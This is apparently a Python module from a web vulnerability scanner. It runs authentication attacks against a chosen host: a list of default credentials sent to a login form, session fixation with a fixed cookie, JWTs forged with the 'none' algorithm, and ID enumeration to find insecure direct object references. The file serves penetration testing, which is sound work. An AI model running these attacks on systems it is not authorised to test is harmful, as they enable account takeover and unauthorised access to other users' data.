"""Phase 2.5 — Broken Authentication & Session Management Tests.

Tests for:
- Default / weak credentials
- Session fixation
- Token manipulation (JWT none-algorithm, signature bypass)
- Privilege escalation (IDOR on user IDs)
- Missing session expiry / insecure cookie flags
"""
from __future__ import annotations

import base64
import json
import logging
import re
import time
from dataclasses import dataclass, field
from typing import Any, Awaitable, Callable

logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════════════
# Data structures
# ═══════════════════════════════════════════════════════════════


@dataclass
class AuthFinding:
    vuln_type: str
    title: str
    severity: str
    url: str
    evidence: str
    request_id: str | None = None

    def to_dict(self) -> dict[str, Any]:
        return {
            "vuln_type": self.vuln_type,
            "title": self.title,
            "severity": self.severity,
            "url": self.url,
            "evidence": self.evidence[:500],
            "request_id": self.request_id,
        }


@dataclass
class AuthTestResult:
    target_url: str
    test_type: str
    findings: list[AuthFinding] = field(default_factory=list)
    requests_sent: int = 0
    errors: list[str] = field(default_factory=list)
    duration: float = 0.0

    def to_dict(self) -> dict[str, Any]:
        return {
            "target_url": self.target_url,
            "test_type": self.test_type,
            "findings_count": len(self.findings),
            "requests_sent": self.requests_sent,
            "errors": self.errors[:10],
            "duration": round(self.duration, 2),
        }


# ═══════════════════════════════════════════════════════════════
# Payload sets
# ═══════════════════════════════════════════════════════════════

DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("root", "root"),
    ("root", "toor"),
    ("test", "test"),
    ("user", "user"),
    ("guest", "guest"),
    ("administrator", "administrator"),
]

IDOR_PAYLOADS = [
    "1", "2", "0", "-1", "999999", "admin",
]


# ═══════════════════════════════════════════════════════════════
# Helpers
# ═══════════════════════════════════════════════════════════════

def _build_get(path: str, host: str, cookie: str = "",
               extra_headers: str = "") -> str:
    h = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: WebPhomet/1.0\r\nAccept: */*"
    if cookie:
        h += f"\r\nCookie: {cookie}"
    if extra_headers:
        h += f"\r\n{extra_headers}"
    return h + "\r\n\r\n"


def _build_post(path: str, host: str, body: str, cookie: str = "",
                content_type: str = "application/x-www-form-urlencoded",
                extra_headers: str = "") -> str:
    h = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: WebPhomet/1.0\r\n"
        f"Content-Type: {content_type}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Accept: */*"
    )
    if cookie:
        h += f"\r\nCookie: {cookie}"
    if extra_headers:
        h += f"\r\n{extra_headers}"
    return h + "\r\n\r\n" + body


# ═══════════════════════════════════════════════════════════════
# Test: Default Credentials
# ═══════════════════════════════════════════════════════════════

async def test_default_credentials(
    send_fn: Callable[..., Awaitable[dict[str, Any]]],
    host: str,
    port: int,
    is_tls: bool,
    login_path: str = "/login",
    username_field: str = "username",
    password_field: str = "password",
    extra_fields: dict[str, str] | None = None,
    success_indicators: list[str] | None = None,
    failure_indicators: list[str] | None = None,
) -> AuthTestResult:
    """Test for default / weak credential combinations."""
    start = time.time()
    base_url = f"{'https' if is_tls else 'http'}://{host}:{port}{login_path}"
    result = AuthTestResult(target_url=base_url, test_type="default_credentials")
    host_header = f"{host}:{port}" if port not in (80, 443) else host

    if success_indicators is None:
        success_indicators = [
            "dashboard", "welcome", "logout", "profile",
            "302", "location:", "set-cookie",
        ]
    if failure_indicators is None:
        failure_indicators = [
            "invalid", "incorrect", "failed", "wrong",
            "login", "error", "denied",
        ]

    for username, password in DEFAULT_CREDENTIALS:
        try:
            body_parts = {username_field: username, password_field: password}
            if extra_fields:
                body_parts.update(extra_fields)
            from urllib.parse import quote
            body = "&".join(f"{k}={quote(v, safe='')}" for k, v in body_parts.items())
            raw = _build_post(login_path, host_header, body)

            resp = await send_fn(raw, host, port, is_tls)
            result.requests_sent += 1
            resp_body = resp.get("body", "").lower()
            status = resp.get("status_code")

            # Heuristic: check if login succeeded
            is_success = False
            if status and status in (301, 302, 303):
                is_success = True
            for ind in success_indicators:
                if ind.lower() in resp_body:
                    is_success = True
                    break
            for ind in failure_indicators:
                if ind.lower() in resp_body:
                    is_success = False
                    break

            if is_success:
                result.findings.append(AuthFinding(
                    vuln_type="default_credentials",
                    title=f"Default credentials: {username}:{password}",
                    severity="critical",
                    url=base_url,
                    evidence=f"Login with {username}:{password} returned status {status}",
                    request_id=resp.get("id"),
                ))
        except Exception as exc:
            result.errors.append(f"default_creds {username}:{password}: {exc}")

    result.duration = time.time() - start
    return result


# ═══════════════════════════════════════════════════════════════
# Test: Session Fixation
# ═══════════════════════════════════════════════════════════════

async def test_session_fixation(
    send_fn: Callable[..., Awaitable[dict[str, Any]]],
    host: str,
    port: int,
    is_tls: bool,
    path: str = "/",
    cookie_name: str = "PHPSESSID",
) -> AuthTestResult:
    """Test if the app accepts a pre-set session ID."""
    start = time.time()
    base_url = f"{'https' if is_tls else 'http'}://{host}:{port}{path}"
    result = AuthTestResult(target_url=base_url, test_type="session_fixation")
    host_header = f"{host}:{port}" if port not in (80, 443) else host

    fixed_sid = "attackercontrolled12345"
    raw = _build_get(path, host_header, cookie=f"{cookie_name}={fixed_sid}")

    try:
        resp = await send_fn(raw, host, port, is_tls)
        result.requests_sent += 1
        body = resp.get("body", "")

        # Check if the server echoed back our session ID or accepted it
        if fixed_sid in body or resp.get("status_code") == 200:
            # Second check: server should issue a new session ID
            raw2 = _build_get(path, host_header)
            resp2 = await send_fn(raw2, host, port, is_tls)
            result.requests_sent += 1

            result.findings.append(AuthFinding(
                vuln_type="session_fixation",
                title=f"Potential session fixation via {cookie_name}",
                severity="high",
                url=base_url,
                evidence=f"Server accepted pre-set session ID '{fixed_sid}'",
                request_id=resp.get("id"),
            ))
    except Exception as exc:
        result.errors.append(f"session_fixation: {exc}")

    result.duration = time.time() - start
    return result


# ═══════════════════════════════════════════════════════════════
# Test: Cookie Security Flags
# ═══════════════════════════════════════════════════════════════

async def test_cookie_flags(
    send_fn: Callable[..., Awaitable[dict[str, Any]]],
    host: str,
    port: int,
    is_tls: bool,
    path: str = "/",
) -> AuthTestResult:
    """Check for missing Secure, HttpOnly, SameSite flags."""
    start = time.time()
    base_url = f"{'https' if is_tls else 'http'}://{host}:{port}{path}"
    result = AuthTestResult(target_url=base_url, test_type="cookie_flags")
    host_header = f"{host}:{port}" if port not in (80, 443) else host

    raw = _build_get(path, host_header)
    try:
        resp = await send_fn(raw, host, port, is_tls)
        result.requests_sent += 1
        body = resp.get("body", "")

        # Check cookies set by the response (in full raw response)
        request_data = resp.get("request") or {}
        resp_obj = request_data.get("response") or {} if isinstance(request_data, dict) else {}

        # We check the raw full response for Set-Cookie headers
        full_raw = ""
        raw_b64 = resp_obj.get("raw", "")
        if raw_b64:
            try:
                import base64 as _b64
                full_raw = _b64.b64decode(raw_b64).decode("utf-8", errors="replace")
            except Exception:
                pass

        # Parse Set-Cookie lines from raw response
        for line in full_raw.split("\r\n"):
            lower = line.lower()
            if lower.startswith("set-cookie:"):
                cookie_val = line[len("set-cookie:"):].strip()
                issues = []
                if "httponly" not in lower:
                    issues.append("Missing HttpOnly")
                if "secure" not in lower and is_tls:
                    issues.append("Missing Secure")
                if "samesite" not in lower:
                    issues.append("Missing SameSite")

                if issues:
                    result.findings.append(AuthFinding(
                        vuln_type="cookie_flags",
                        title=f"Insecure cookie flags: {', '.join(issues)}",
                        severity="medium",
                        url=base_url,
                        evidence=f"Set-Cookie: {cookie_val[:200]}",
                        request_id=resp.get("id"),
                    ))
    except Exception as exc:
        result.errors.append(f"cookie_flags: {exc}")

    result.duration = time.time() - start
    return result


# ═══════════════════════════════════════════════════════════════
# Test: JWT None Algorithm
# ═══════════════════════════════════════════════════════════════

async def test_jwt_none_alg(
    send_fn: Callable[..., Awaitable[dict[str, Any]]],
    host: str,
    port: int,
    is_tls: bool,
    path: str = "/api/user",
    auth_header: str = "",
) -> AuthTestResult:
    """Test JWT 'none' algorithm bypass."""
    start = time.time()
    base_url = f"{'https' if is_tls else 'http'}://{host}:{port}{path}"
    result = AuthTestResult(target_url=base_url, test_type="jwt_none_alg")
    host_header = f"{host}:{port}" if port not in (80, 443) else host

    if not auth_header:
        result.duration = time.time() - start
        return result

    # Try to decode existing JWT
    try:
        parts = auth_header.replace("Bearer ", "").split(".")
        if len(parts) != 3:
            result.duration = time.time() - start
            return result

        # Decode header and payload
        def _b64_pad(s):
            return s + "=" * (4 - len(s) % 4)

        header = json.loads(base64.b64decode(_b64_pad(parts[0])))
        payload = json.loads(base64.b64decode(_b64_pad(parts[1])))

        # Create none-algorithm token
        none_header = base64.b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).decode().rstrip("=")
        none_payload = base64.b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip("=")
        none_token = f"{none_header}.{none_payload}."

        raw = _build_get(
            path, host_header,
            extra_headers=f"Authorization: Bearer {none_token}",
        )
        resp = await send_fn(raw, host, port, is_tls)
        result.requests_sent += 1
        status = resp.get("status_code")

        if status and status < 400:
            result.findings.append(AuthFinding(
                vuln_type="jwt_none_alg",
                title="JWT 'none' algorithm accepted",
                severity="critical",
                url=base_url,
                evidence=f"Server returned {status} with none-algorithm JWT",
                request_id=resp.get("id"),
            ))
    except Exception as exc:
        result.errors.append(f"jwt_none_alg: {exc}")

    result.duration = time.time() - start
    return result


# ═══════════════════════════════════════════════════════════════
# Test: IDOR (Insecure Direct Object Reference)
# ═══════════════════════════════════════════════════════════════

async def test_idor(
    send_fn: Callable[..., Awaitable[dict[str, Any]]],
    host: str,
    port: int,
    is_tls: bool,
    path_pattern: str = "/api/users/{id}",
    cookie: str = "",
    auth_header: str = "",
    baseline_id: str = "1",
) -> AuthTestResult:
    """Test for IDOR by accessing resources with different IDs."""
    start = time.time()
    base_url = f"{'https' if is_tls else 'http'}://{host}:{port}{path_pattern}"
    result = AuthTestResult(target_url=base_url, test_type="idor")
    host_header = f"{host}:{port}" if port not in (80, 443) else host

    # First, get baseline response
    baseline_path = path_pattern.replace("{id}", baseline_id)
    extra = ""
    if auth_header:
        extra = f"Authorization: {auth_header}"
    raw = _build_get(baseline_path, host_header, cookie=cookie, extra_headers=extra)

    try:
        baseline_resp = await send_fn(raw, host, port, is_tls)
        result.requests_sent += 1
        baseline_status = baseline_resp.get("status_code")
        baseline_body = baseline_resp.get("body", "")
    except Exception as exc:
        result.errors.append(f"idor baseline: {exc}")
        result.duration = time.time() - start
        return result

    # Try other IDs
    for test_id in IDOR_PAYLOADS:
        if test_id == baseline_id:
            continue
        try:
            test_path = path_pattern.replace("{id}", test_id)
            raw = _build_get(test_path, host_header, cookie=cookie, extra_headers=extra)
            resp = await send_fn(raw, host, port, is_tls)
            result.requests_sent += 1
            status = resp.get("status_code")
            body = resp.get("body", "")

            # If we can access other user's data with same auth
            if status and status < 400 and body and body != baseline_body:
                result.findings.append(AuthFinding(
                    vuln_type="idor",
                    title=f"IDOR: Access to resource {test_id} with same auth",
                    severity="high",
                    url=f"{'https' if is_tls else 'http'}://{host}:{port}{test_path}",
                    evidence=f"Status {status}, different body ({len(body)} bytes vs {len(baseline_body)} baseline)",
                    request_id=resp.get("id"),
                ))
        except Exception as exc:
            result.errors.append(f"idor {test_id}: {exc}")

    result.duration = time.time() - start
    return result


# ═══════════════════════════════════════════════════════════════
# Test mapping
# ═══════════════════════════════════════════════════════════════

AUTH_TESTS: dict[str, Callable[..., Awaitable[AuthTestResult]]] = {
    "default_credentials": test_default_credentials,
    "session_fixation": test_session_fixation,
    "cookie_flags": test_cookie_flags,
    "jwt_none_alg": test_jwt_none_alg,
    "idor": test_idor,
}


# ═══════════════════════════════════════════════════════════════
# Combined runner
# ═══════════════════════════════════════════════════════════════

async def run_auth_tests(
    send_fn: Callable[..., Awaitable[dict[str, Any]]],
    host: str,
    port: int,
    is_tls: bool,
    test_types: list[str] | None = None,
    login_path: str = "/login",
    cookie: str = "",
    auth_header: str = "",
    idor_path_pattern: str = "/api/users/{id}",
    username_field: str = "username",
    password_field: str = "password",
    extra_login_fields: dict[str, str] | None = None,
) -> list[AuthTestResult]:
    """Run a suite of auth tests.

    Parameters
    ----------
    send_fn: async (raw, host, port, is_tls) → response dict
    test_types: Tests to run (default: all non-JWT).
    """
    if test_types is None:
        test_types = ["default_credentials", "session_fixation", "cookie_flags"]

    results: list[AuthTestResult] = []

    for test_type in test_types:
        if test_type == "default_credentials":
            r = await test_default_credentials(
                send_fn, host, port, is_tls,
                login_path=login_path,
                username_field=username_field,
                password_field=password_field,
                extra_fields=extra_login_fields,
            )
            results.append(r)
        elif test_type == "session_fixation":
            r = await test_session_fixation(send_fn, host, port, is_tls)
            results.append(r)
        elif test_type == "cookie_flags":
            r = await test_cookie_flags(send_fn, host, port, is_tls)
            results.append(r)
        elif test_type == "jwt_none_alg":
            r = await test_jwt_none_alg(
                send_fn, host, port, is_tls,
                auth_header=auth_header,
            )
            results.append(r)
        elif test_type == "idor":
            r = await test_idor(
                send_fn, host, port, is_tls,
                path_pattern=idor_path_pattern,
                cookie=cookie,
                auth_header=auth_header,
            )
            results.append(r)
        else:
            logger.warning("Unknown auth test type: %s", test_type)

    return results
